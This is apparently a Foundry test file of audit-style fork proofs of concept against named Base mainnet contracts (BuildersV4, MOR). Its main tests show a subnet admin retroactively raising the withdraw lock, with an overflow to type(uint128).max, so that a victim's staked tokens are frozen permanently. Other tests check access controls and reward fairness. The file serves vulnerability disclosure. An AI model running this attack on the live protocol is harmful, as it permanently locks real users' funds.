// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }
    struct UserData {
        uint128 lastDeposit;
        uint128 unusedStorage1_V4Update;
        uint256 deposited;
        uint256 unusedStorage2_V4Update;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function usersData(address user_, bytes32 subnetId_) external view returns (UserData memory);
    function owner() external view returns (address);
    function setNetworkShare(uint256 networkShare_) external;
    function setFeeConfig(address feeConfig_) external;
    function setRewardPool(address rewardPool_) external;
    function setSubnetCreationFeeAmount(uint256 subnetCreationFeeAmount_) external;
    function subnetCreationFeeAmount() external view returns (uint256);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

interface IBuildersTreasuryV2 {
    function sendRewards(address receiver_, uint256 amount_) external;
    function withdraw(address receiver_, uint256 amount_) external;
}

/// @notice T3 Builders — fork PoCs against deployed Base contracts.
/// @dev Fork pinned to Base block 58431348. Run:
///      BASE_RPC_URL=https://mainnet.base.org forge test -vvv
///      Attacker/victim are fresh unprivileged addresses anyone can control.
///      No vm.prank as owner/admin/multisig anywhere in this file.
contract T3BuildersTest is Test {
    IBuildersV4 internal constant BUILDERS =
        IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IBuildersTreasuryV2 internal constant TREASURY =
        IBuildersTreasuryV2(0x9eba628581896ce086cb8f1A513ea6097A8FC561);
    IERC20 internal constant MOR = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);

    address internal constant MULTISIG = 0x1FE04BC15Cf2c5A2d41a0b3a96725596676eBa1E;

    address internal attacker = address(0xA77AC4E12);
    address internal victim = address(0xB1C71A);

    uint256 internal constant VICTIM_DEPOSIT = 1000 ether; // 1000 MOR ~ $700 @ $0.70

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), 58431348);
        vm.label(attacker, "attacker");
        vm.label(victim, "victim");
    }

    function _subnet(string memory name_, address admin_, uint128 lock_) internal pure returns (IBuildersV4.Subnet memory) {
        return IBuildersV4.Subnet({
            name: name_,
            admin: admin_,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: lock_,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1,
            claimAdmin: admin_
        });
    }

    function _meta() internal pure returns (IBuildersV4.SubnetMetadata memory) {
        return IBuildersV4.SubnetMetadata({slug: "t3-poc", description: "t3 poc", website: "", image: ""});
    }

    function _victimDeposits(bytes32 subnetId_, uint256 amount_) internal {
        deal(address(MOR), victim, MOR.balanceOf(victim) + amount_);
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), amount_);
        BUILDERS.deposit(subnetId_, amount_);
        vm.stopPrank();
    }

    /// @notice T3-01 (MAIN): a permissionless subnet admin raises the withdraw lock
    /// after deposits and permanently locks every staker's principal.
    /// With lock = type(uint128).max, `lastDeposit + lock` overflows uint128 and
    /// withdraw() reverts with an arithmetic panic on EVERY attempt, forever.
    function testSubnetAdminPermanentlyLocksStakersPrincipal() public {
        // Attacker holds no protocol role and subnet creation is free.
        assertTrue(attacker != BUILDERS.owner());
        assertTrue(attacker != MULTISIG);
        assertEq(BUILDERS.subnetCreationFeeAmount(), 0, "creation must be free");

        // 1. Attacker creates a subnet, admin = claimAdmin = attacker, 7-day lock.
        vm.prank(attacker);
        BUILDERS.createSubnet(_subnet("T3PoCSubnet", attacker, 604800), _meta());
        bytes32 subnetId = BUILDERS.getSubnetId("T3PoCSubnet");

        // 2. Victim stakes 1000 MOR under the disclosed 7-day terms.
        _victimDeposits(subnetId, VICTIM_DEPOSIT);
        assertEq(MOR.balanceOf(victim), 0, "victim fully staked");
        assertEq(BUILDERS.usersData(victim, subnetId).deposited, VICTIM_DEPOSIT);

        // 3. After the 7-day lock expires, exit works under the original terms.
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, 1 ether);
        assertEq(MOR.balanceOf(victim), 1 ether, "pre-attack exit works");
        // Top back up to 1000 MOR (resets lastDeposit) and wait out the lock again.
        _victimDeposits(subnetId, 1 ether);
        vm.warp(block.timestamp + 8 days);
        assertEq(BUILDERS.usersData(victim, subnetId).deposited, VICTIM_DEPOSIT);

        // 4. ATTACK: admin retroactively raises the lock to type(uint128).max.
        //    _validateSubnet enforces only a LOWER bound (>= 604800), no upper bound.
        vm.prank(attacker);
        BUILDERS.editSubnet(subnetId, _subnet("T3PoCSubnet", attacker, type(uint128).max));

        // 5. Victim can never withdraw again: panic on every attempt, even 100y later.
        vm.prank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(subnetId, VICTIM_DEPOSIT);
        vm.warp(block.timestamp + 100 * 365 days);
        vm.prank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(subnetId, VICTIM_DEPOSIT);

        // 6. LOSS ASSERTION: the 1000 MOR (~$700) is permanently stuck in BuildersV4.
        //    Victim kept only the 1 MOR withdrawn before the attack; the rest is
        //    unrecoverable by any action available to the victim (only the attacker
        //    lowering the lock could release it, which the attacker will not do).
        assertEq(MOR.balanceOf(victim), 1 ether, "victim recovered only pre-attack 1 MOR");
        assertEq(BUILDERS.usersData(victim, subnetId).deposited, VICTIM_DEPOSIT, "1000 MOR still locked");
        assertGe(MOR.balanceOf(address(BUILDERS)), VICTIM_DEPOSIT, "funds still held by BuildersV4");
    }

    /// @notice T3-01b: the overflow is not load-bearing — a "plausible" 100-year lock
    /// also strands deposits for a century (reverts with "BU: user withdraw is locked").
    function testSubnetAdminHundredYearLock() public {
        vm.prank(attacker);
        BUILDERS.createSubnet(_subnet("T3PoCLong", attacker, 604800), _meta());
        bytes32 subnetId = BUILDERS.getSubnetId("T3PoCLong");
        _victimDeposits(subnetId, VICTIM_DEPOSIT);

        vm.warp(block.timestamp + 8 days);
        vm.prank(attacker);
        BUILDERS.editSubnet(subnetId, _subnet("T3PoCLong", attacker, uint128(100 * 365 days)));

        vm.warp(block.timestamp + 10 * 365 days); // 10 years later: still locked
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        BUILDERS.withdraw(subnetId, VICTIM_DEPOSIT);
        assertEq(BUILDERS.usersData(victim, subnetId).deposited, VICTIM_DEPOSIT, "1000 MOR still locked");
        assertEq(MOR.balanceOf(victim), 0, "victim recovered 0 MOR");
    }

    /// @notice T3-04 (negative): unprivileged addresses cannot acquire protocol roles
    /// or act on another subnet. Every privileged call must revert.
    function testUnprivilegedCannotAcquireRolesOrTouchOthersSubnets() public {
        vm.prank(attacker);
        vm.expectRevert();
        BUILDERS.setNetworkShare(0);
        vm.prank(attacker);
        vm.expectRevert();
        BUILDERS.setFeeConfig(attacker);
        vm.prank(attacker);
        vm.expectRevert();
        BUILDERS.setRewardPool(attacker);
        vm.prank(attacker);
        vm.expectRevert();
        BUILDERS.setSubnetCreationFeeAmount(1 ether);
        vm.prank(attacker);
        vm.expectRevert();
        TREASURY.withdraw(attacker, 1);
        vm.prank(attacker);
        vm.expectRevert();
        TREASURY.sendRewards(attacker, 1);

        // Victim owns their own subnet; attacker can neither edit nor claim it.
        vm.prank(victim);
        BUILDERS.createSubnet(_subnet("T3PoCVictimSubnet", victim, 604800), _meta());
        bytes32 victimSubnet = BUILDERS.getSubnetId("T3PoCVictimSubnet");
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        BUILDERS.editSubnet(victimSubnet, _subnet("T3PoCVictimSubnet", attacker, 604800));
        vm.prank(attacker);
        vm.expectRevert("BU: invalid caller");
        BUILDERS.claim(victimSubnet, attacker);
    }

    /// @notice T3-03 (negative/fairness): equal stakes in two subnets over the same
    /// window earn equal rewards — no subnet can siphon another's share via the
    /// global-rate accounting.
    function testEqualStakesEarnEqualRewards() public {
        vm.prank(attacker);
        BUILDERS.createSubnet(_subnet("T3PoCFairA", attacker, 604800), _meta());
        vm.prank(victim);
        BUILDERS.createSubnet(_subnet("T3PoCFairB", victim, 604800), _meta());
        bytes32 subnetA = BUILDERS.getSubnetId("T3PoCFairA");
        bytes32 subnetB = BUILDERS.getSubnetId("T3PoCFairB");

        // Equal 1000 MOR deposits in the same block (no time passes between them).
        _fundAndDeposit(attacker, subnetA, VICTIM_DEPOSIT);
        _fundAndDeposit(victim, subnetB, VICTIM_DEPOSIT);

        vm.warp(block.timestamp + 30 days);

        uint256 pendingA = BUILDERS.getCurrentSubnetRewards(subnetA);
        uint256 pendingB = BUILDERS.getCurrentSubnetRewards(subnetB);
        assertGt(pendingA, 0, "subnet A accrued rewards");
        assertGt(pendingB, 0, "subnet B accrued rewards");

        vm.prank(attacker);
        BUILDERS.claim(subnetA, attacker);
        vm.prank(victim);
        BUILDERS.claim(subnetB, victim);

        uint256 claimedA = MOR.balanceOf(attacker);
        uint256 claimedB = MOR.balanceOf(victim);
        // Equal stakes over the same window => equal claims up to dust (0.001 MOR).
        uint256 diff = claimedA > claimedB ? claimedA - claimedB : claimedB - claimedA;
        assertLe(diff, 1e15, "claims must match within dust");
        emit log_named_uint("claimedA MOR (wei)", claimedA);
        emit log_named_uint("claimedB MOR (wei)", claimedB);
    }

    function _fundAndDeposit(address who_, bytes32 subnetId_, uint256 amount_) internal {
        // _victimDeposits is victim-specific; this helper funds any test address.
        // NOTE: only used with the two unprivileged test addresses above.
        deal(address(MOR), who_, MOR.balanceOf(who_) + amount_);
        vm.startPrank(who_);
        MOR.approve(address(BUILDERS), amount_);
        BUILDERS.deposit(subnetId_, amount_);
        vm.stopPrank();
    }
}
